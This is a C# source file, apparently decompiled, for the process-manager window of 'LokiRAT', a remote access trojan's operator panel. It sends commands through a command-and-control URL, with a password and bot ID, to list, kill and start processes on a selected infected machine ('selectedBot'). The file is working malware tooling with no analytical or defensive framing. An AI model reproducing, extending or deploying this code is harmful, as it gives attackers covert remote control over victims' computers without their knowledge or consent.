namespace LokiRAT_Server
{
    using System;
    using System.ComponentModel;
    using System.Drawing;
    using System.Net;
    using System.Text.RegularExpressions;
    using System.Windows.Forms;

    public class processManager : Form
    {
        private WebClient client = new WebClient();
        private ColumnHeader columnHeader1;
        private ColumnHeader columnHeader2;
        private ColumnHeader columnHeader3;
        private IContainer components = null;
        private ContextMenuStrip contextMenuStrip1;
        private ImageList imageList1;
        private ToolStripMenuItem killProcessToolStripMenuItem1;
        private ListView listView1;
        private string myLastCommand = "-1";
        private ToolStripMenuItem reloadToolStripMenuItem1;
        private ToolStripMenuItem startProcessToolStripMenuItem1;
        private System.Windows.Forms.Timer timer1;
        private ToolStripSeparator toolStripSeparator1;

        public processManager()
        {
            this.InitializeComponent();
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing && (this.components != null))
            {
                this.components.Dispose();
            }
            base.Dispose(disposing);
        }

        private void InitializeComponent()
        {
            this.components = new Container();
            ComponentResourceManager manager = new ComponentResourceManager(typeof(processManager));
            this.listView1 = new ListView();
            this.columnHeader1 = new ColumnHeader();
            this.columnHeader2 = new ColumnHeader();
            this.columnHeader3 = new ColumnHeader();
            this.contextMenuStrip1 = new ContextMenuStrip(this.components);
            this.reloadToolStripMenuItem1 = new ToolStripMenuItem();
            this.toolStripSeparator1 = new ToolStripSeparator();
            this.killProcessToolStripMenuItem1 = new ToolStripMenuItem();
            this.startProcessToolStripMenuItem1 = new ToolStripMenuItem();
            this.imageList1 = new ImageList(this.components);
            this.timer1 = new System.Windows.Forms.Timer(this.components);
            this.contextMenuStrip1.SuspendLayout();
            base.SuspendLayout();
            this.listView1.Anchor = AnchorStyles.Right | AnchorStyles.Left | AnchorStyles.Bottom | AnchorStyles.Top;
            this.listView1.Columns.AddRange(new ColumnHeader[] { this.columnHeader1, this.columnHeader2, this.columnHeader3 });
            this.listView1.ContextMenuStrip = this.contextMenuStrip1;
            this.listView1.FullRowSelect = true;
            this.listView1.GridLines = true;
            this.listView1.Location = new Point(0, -2);
            this.listView1.MultiSelect = false;
            this.listView1.Name = "listView1";
            this.listView1.ShowGroups = false;
            this.listView1.Size = new Size(530, 0x167);
            this.listView1.SmallImageList = this.imageList1;
            this.listView1.TabIndex = 0;
            this.listView1.UseCompatibleStateImageBehavior = false;
            this.listView1.View = View.Details;
            this.columnHeader1.Text = "Image Name";
            this.columnHeader1.Width = 0x8a;
            this.columnHeader2.Text = "Memory (Private Working Set)";
            this.columnHeader2.Width = 120;
            this.columnHeader3.Text = "Window Title";
            this.columnHeader3.Width = 210;
            this.contextMenuStrip1.Items.AddRange(new ToolStripItem[] { this.reloadToolStripMenuItem1, this.toolStripSeparator1, this.killProcessToolStripMenuItem1, this.startProcessToolStripMenuItem1 });
            this.contextMenuStrip1.Name = "contextMenuStrip1";
            this.contextMenuStrip1.Size = new Size(0x8e, 0x4c);
            this.reloadToolStripMenuItem1.Image = (Image) manager.GetObject("reloadToolStripMenuItem1.Image");
            this.reloadToolStripMenuItem1.Name = "reloadToolStripMenuItem1";
            this.reloadToolStripMenuItem1.Size = new Size(0x8d, 0x16);
            this.reloadToolStripMenuItem1.Text = "Reload";
            this.reloadToolStripMenuItem1.Click += new EventHandler(this.reloadToolStripMenuItem1_Click);
            this.toolStripSeparator1.Name = "toolStripSeparator1";
            this.toolStripSeparator1.Size = new Size(0x8a, 6);
            this.killProcessToolStripMenuItem1.Image = (Image) manager.GetObject("killProcessToolStripMenuItem1.Image");
            this.killProcessToolStripMenuItem1.Name = "killProcessToolStripMenuItem1";
            this.killProcessToolStripMenuItem1.Size = new Size(0x8d, 0x16);
            this.killProcessToolStripMenuItem1.Text = "Kill Process";
            this.killProcessToolStripMenuItem1.Click += new EventHandler(this.killProcessToolStripMenuItem1_Click);
            this.startProcessToolStripMenuItem1.Image = (Image) manager.GetObject("startProcessToolStripMenuItem1.Image");
            this.startProcessToolStripMenuItem1.Name = "startProcessToolStripMenuItem1";
            this.startProcessToolStripMenuItem1.Size = new Size(0x8d, 0x16);
            this.startProcessToolStripMenuItem1.Text = "Start Process";
            this.startProcessToolStripMenuItem1.Click += new EventHandler(this.startProcessToolStripMenuItem1_Click);
            this.imageList1.ImageStream = (ImageListStreamer) manager.GetObject("imageList1.ImageStream");
            this.imageList1.TransparentColor = Color.Transparent;
            this.imageList1.Images.SetKeyName(0, "App.png");
            this.timer1.Enabled = true;
            this.timer1.Interval = 500;
            this.timer1.Tick += new EventHandler(this.timer1_Tick);
            base.AutoScaleDimensions = new SizeF(6f, 13f);
            base.AutoScaleMode = AutoScaleMode.Font;
            base.ClientSize = new Size(530, 0x165);
            base.Controls.Add(this.listView1);
            base.Icon = (Icon) manager.GetObject("$this.Icon");
            base.Name = "processManager";
            this.Text = "Process Manager | LokiRAT";
            base.Load += new EventHandler(this.processManager_Load);
            this.contextMenuStrip1.ResumeLayout(false);
            base.ResumeLayout(false);
        }

        private void killProcessToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                this.loadPage("type=command&command=pkill|" + this.listView1.SelectedItems[0].Text);
                this.listView1.Items.Clear();
            }
            catch
            {
            }
        }

        private void killProcessToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                this.loadPage("type=command&command=pkill|" + this.listView1.SelectedItems[0].Text);
                this.listView1.Items.Clear();
            }
            catch
            {
            }
        }

        public string loadPage(string toHost)
        {
            string str = null;
            try
            {
                this.client.Headers["User-Agent"] = main.userAgent;
                str = this.client.DownloadString(main.connectionURL + "?pass=" + main.connectionPass + "&id=" + main.currentID + "&" + toHost);
            }
            catch
            {
                new configuration().ShowDialog();
            }
            return str;
        }

        private void processManager_Load(object sender, EventArgs e)
        {
            this.loadPage("type=command&command=process");
        }

        private void reloadToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.listView1.Items.Clear();
            this.loadPage("type=command&command=process");
        }

        private void reloadToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            this.listView1.Items.Clear();
            this.loadPage("type=command&command=process");
        }

        private void startProcessToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new execute().ShowDialog();
        }

        private void startProcessToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            new execute().ShowDialog();
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            string[] strArray = new string[5];
            string[] strArray2 = new string[5];
            try
            {
                if (main.lastCommand[main.selectedBot] != this.myLastCommand)
                {
                    this.myLastCommand = main.lastCommand[main.selectedBot];
                    strArray2 = Regex.Split(main.lastCommandText[main.selectedBot], "{-p}");
                    if (strArray2[0] == "LSprocess")
                    {
                        this.listView1.Items.Clear();
                        for (int i = 1; i < (strArray2.Length - 1); i++)
                        {
                            strArray = Regex.Split(strArray2[i], "{-pi}");
                            ListViewItem item = this.listView1.Items.Add(strArray[0]);
                            item.ImageIndex = 0;
                            int num2 = Convert.ToInt32(strArray[1]) / 0x400;
                            item.SubItems.Add(num2.ToString() + " KB");
                            item.SubItems.Add(strArray[2]);
                        }
                    }
                    else if (strArray2[0] == "RSpkill")
                    {
                        this.loadPage("type=command&command=process");
                    }
                }
            }
            catch
            {
            }
        }
    }
}

